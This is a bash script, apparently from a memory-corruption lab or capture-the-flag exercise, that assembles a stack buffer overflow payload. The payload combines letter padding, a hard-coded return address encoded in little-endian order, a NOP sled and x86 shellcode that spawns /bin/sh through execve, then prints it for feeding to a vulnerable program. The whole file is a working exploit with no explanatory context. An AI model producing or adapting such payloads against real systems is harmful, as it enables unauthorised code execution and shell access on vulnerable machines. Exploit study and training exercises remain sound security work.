#!/bin/bash
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

offset="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"

# Jump on the stack, somewhere into the nop flower field
jmp=`$DIR/encode_switch_endianness.sh bffff6fc`

# Create the nopnop flower field on the stack
nop_hex=`printf '90909090%.0s' {1..20}`
nop=`$DIR/encode.sh $nop_hex`

# Run the shell
shellcode=`$DIR/encode.sh 31c9f7e1b00b51682f2f7368682f62696e89e3cd80`

echo "$offset$jmp$nop$shellcode"
